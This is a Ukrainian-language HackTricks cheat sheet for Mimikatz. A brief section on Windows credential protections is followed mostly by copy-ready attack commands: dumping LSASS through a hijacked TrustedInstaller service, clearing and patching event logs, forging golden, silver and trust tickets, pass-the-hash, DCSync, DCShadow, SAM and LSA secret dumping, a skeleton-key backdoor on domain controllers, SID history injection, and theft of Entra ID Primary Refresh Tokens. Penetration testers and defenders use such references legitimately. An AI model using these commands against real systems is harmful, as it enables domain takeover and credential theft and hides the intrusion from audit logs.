# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ця сторінка ґрунтується на матеріалі з [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Перегляньте оригінал, щоб дізнатися більше!<sup>[[3]](#references)</sup>

## LM and Clear-Text in memory

Починаючи з Windows 8.1 і Windows Server 2012 R2, було впроваджено значні заходи для захисту від викрадення облікових даних:

- **LM-хеші та паролі у відкритому тексті** більше не зберігаються в пам’яті, що підвищує безпеку. Щоб вимкнути Digest Authentication і не допускати кешування паролів у «відкритому тексті» в LSASS, потрібно налаштувати певний параметр реєстру _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ і встановити для нього значення DWORD `0`.

- **LSA Protection** захищає процес Local Security Authority (LSA) від несанкціонованого читання пам’яті та впровадження коду. Для цього LSASS позначається як захищений процес. Щоб активувати LSA Protection:
  1. Змініть реєстр у _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши для `RunAsPPL` значення `dword:00000001`.
  2. Створіть Group Policy Object (GPO), який застосовуватиме цю зміну реєстру на всіх керованих пристроях.

Попри ці засоби захисту, такі інструменти, як Mimikatz, можуть обходити LSA Protection за допомогою спеціальних драйверів, хоча такі дії, імовірно, фіксуватимуться в журналах подій.

На сучасних робочих станціях це ще важливіше, оскільки **Credential Guard увімкнено за замовчуванням у багатьох системах Windows 11 22H2+ і Windows Server 2025, приєднаних до домену та не виконуючих роль контролера домену**, а **LSASS-as-PPL увімкнено за замовчуванням у нових інсталяціях Windows 11 22H2+**. На практиці це означає, що `sekurlsa::logonpasswords` часто повертає менше даних, ніж очікували старіші методи, і оператори дедалі частіше переходять до **офлайн minidump-файлів**, **вилучення ключів Kerberos (`sekurlsa::ekeys`)** або **модулів, орієнтованих на CloudAP/PRT**. Інформацію про засоби захисту див. у розділі [захист облікових даних Windows](credentials-protections.md).

### Протидія видаленню SeDebugPrivilege

Адміністратори зазвичай мають SeDebugPrivilege, що дає змогу налагоджувати програми. Цей привілей можна обмежити, щоб запобігти несанкціонованому створенню дампів пам’яті — поширеному методу, який зловмисники використовують для вилучення облікових даних із пам’яті. Однак навіть після видалення цього привілею обліковий запис TrustedInstaller усе ще може створювати дампи пам’яті за допомогою спеціально налаштованої конфігурації служби:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Це дає змогу зберегти дамп пам’яті `lsass.exe` у файл, який потім можна проаналізувати в іншій системі, щоб отримати облікові дані:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Параметри Mimikatz

Підробка журналу подій у Mimikatz передбачає дві основні дії: очищення журналів подій і патчинг служби журналу подій, щоб запобігти запису нових подій. Нижче наведено команди для виконання цих дій:

#### Очищення журналів подій

У Mimikatz є команда `event::clear`. Вона викликає API Windows для очищення журналу подій для вибраного класичного журналу. За замовчуванням це `Security`; параметр `/log:` дає змогу вибрати інший журнал, а для його очищення потрібні відповідні права. Це не те саме, що `event::drop`, яка намагається зупинити запис нових подій.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Експериментальна функція: виправлення Event Service

- **Команда**: `event::drop`
- Ця експериментальна команда призначена для зміни поведінки Event Logging Service, фактично перешкоджаючи запису нових подій.
- Приклад: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` надає Mimikatz необхідні привілеї для зміни системних служб.
- Після цього команда `event::drop` виправляє Event Logging service.

### Атаки з квитками Kerberos

Використовуйте наведені нижче команди як коротку підказку щодо синтаксису. На окремих сторінках про [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) і [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) містяться актуальні нюанси щодо AES/PAC/opsec.

### Створення Golden Ticket

Golden Ticket дає змогу імітувати доступ на рівні всього домену. Основна команда та параметри:

- Команда: `kerberos::golden`
- Параметри:
  - `/domain`: назва домену.
  - `/sid`: Security Identifier (SID) домену.
  - `/user`: ім’я користувача, якого потрібно імітувати.
  - `/krbtgt`: NTLM-хеш облікового запису служби KDC домену.
  - `/ptt`: безпосередньо впроваджує квиток у пам’ять.
  - `/ticket`: зберігає квиток для подальшого використання.

Приклад:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Створення Silver Ticket

Silver Tickets надають доступ до певних служб. Основна команда та параметри:

- Команда: схожа на Golden Ticket, але націлена на певні служби.
- Параметри:
  - `/service`: служба, на яку націлено (наприклад, cifs, http).
  - Інші параметри, як у Golden Ticket.

Приклад:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Створення Trust Ticket

Trust Tickets використовуються для доступу до ресурсів у різних доменах завдяки використанню довірчих відносин. Основні команда та параметри:

- Команда: Подібна до Golden Ticket, але призначена для довірчих відносин.
- Параметри:
  - `/target`: FQDN цільового домену.
  - `/rc4`: NTLM-хеш облікового запису довіри.

Приклад:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Додаткові команди Kerberos

- **Перелік квитків**:

  - Команда: `kerberos::list`
  - Виводить усі квитки Kerberos для поточного сеансу користувача.

- **Pass the Cache**: `kerberos::ptc` читає файл MIT/Heimdal `.ccache`, **а не** файл `.kirbi`. Укажіть шлях до файла як позиційний аргумент: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` читає файл `.kirbi` або каталог із такими файлами. Також приймає позиційний шлях, а не `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Докладніше про загальний процес див. у розділі [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md).<sup>[[6]](#references)</sup>

- **Очищення квитків**:
  - Команда: `kerberos::purge`
  - Видаляє всі квитки Kerberos із сеансу.
  - Стане в пригоді перед використанням команд для маніпуляцій із квитками, щоб уникнути конфліктів.

### Over-Pass-the-Hash / Pass-the-Key

Якщо `RC4` вимкнено або він працює ненадійно, Mimikatz може впровадити **ключі AES128/AES256 Kerberos** у поточний сеанс входу замість використання лише NT-хешу. Зазвичай це краще підходить для сучасних доменів, ніж розглядати `sekurlsa::pth` лише як інструмент для NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` повторно використовує поточний процес, а не запускає нову консоль, що зручно, коли потрібно одразу виконати команди на кшталт `lsadump::dcsync` у тому самому контексті.

### Втручання в Active Directory

- **DCShadow**: Тимчасово перетворює машину на DC для маніпуляцій з об’єктами AD. Див. [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітує DC, щоб запитувати дані паролів. Див. [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Отримання облікових даних

- **LSADUMP::LSA**: Витягує облікові дані з LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітує DC, використовуючи дані пароля облікового запису комп’ютера.

  - _У вихідному контексті конкретної команди для NetSync не наведено._

- **LSADUMP::SAM**: Отримує доступ до локальної бази даних SAM.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифровує секрети, збережені в реєстрі.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановлює новий хеш NTLM для користувача.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримує дані автентифікації довіри.
  - `mimikatz "lsadump::trust" exit`

### Облікові дані хмари / Entra ID

На хостах із **Entra ID** або **гібридним приєднанням** команда `sekurlsa::cloudap` може отримати з LSASS кешовані дані **Primary Refresh Token (PRT)**. Значення `ProofOfPossesionKey.KeyValue` — це захищений DPAPI сеансовий ключ у вигляді блоба, а не вже розшифрований ключ.<sup>[[7]](#references)[[8]](#references)</sup> Щоб використати `/unprotect`, запустіть `dpapi::cloudapkd` від імені `SYSTEM` (наприклад, виконавши `token::elevate` з підвищеної сесії Mimikatz) або спершу заповніть кеш ключів Mimikatz за допомогою `sekurlsa::dpapi`. Самої команди `privilege::debug` недостатньо, щоб змінити контекст виклику DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Скопіюйте **відповідні** `Context` і `Derived Key` з першої команди до другої; Mimikatz генерує новий context, якщо його не вказано. Навіть для ключа, захищеного TPM, Mimikatz може отримати signing key за допомогою TPM на оригінальному пристрої. Не обов’язково експортувати ключ у відкритому вигляді, але успішне отримання похідного ключа дає змогу підписати cookie браузера.<sup>[[7]](#references)</sup>

Самого рядка PRT недостатньо, оскільки Microsoft Entra вимагає підтвердження володіння пов’язаним ключем сесії.<sup>[[9]](#references)</sup> Інші варіанти роботи з master key див. у розділі [Відновлення ключів DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md), а ланцюжок дій у хмарі — у розділі [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Різне

- **MISC::Skeleton**: Впровадити бекдор у LSASS на DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Підвищення привілеїв

- **PRIVILEGE::Backup**: Отримати права резервного копіювання.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Отримати права налагодження.
  - `mimikatz "privilege::debug" exit`

### Вилучення облікових даних

- **SEKURLSA::LogonPasswords**: Показати облікові дані користувачів, які ввійшли в систему.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Витягти квитки Kerberos із пам’яті.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Маніпуляції з SID і токенами

- **SID::add/modify**: Змінити SID і SIDHistory.

  - Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Змінити: _У вихідному контексті конкретної команди для зміни не наведено._

- **TOKEN::Elevate**: Імперсонувати токени.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Дозволити кілька RDP-сесій.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Перелічити сеанси TS/RDP.
  - _Конкретну команду для TS::Sessions не наведено._

### Сховище облікових даних

- Витягти паролі зі Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Інструменти The Hacker – модулі Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB і Entra ID: знайомтеся з новим потоком кешування](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Довідник команд Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Вихідний код модуля подій Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Вихідний код модуля ccache Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Вихідний код модуля Kerberos Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Реалізація CloudAP DPAPI у Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Докладніше про Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Захист Microsoft Entra Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
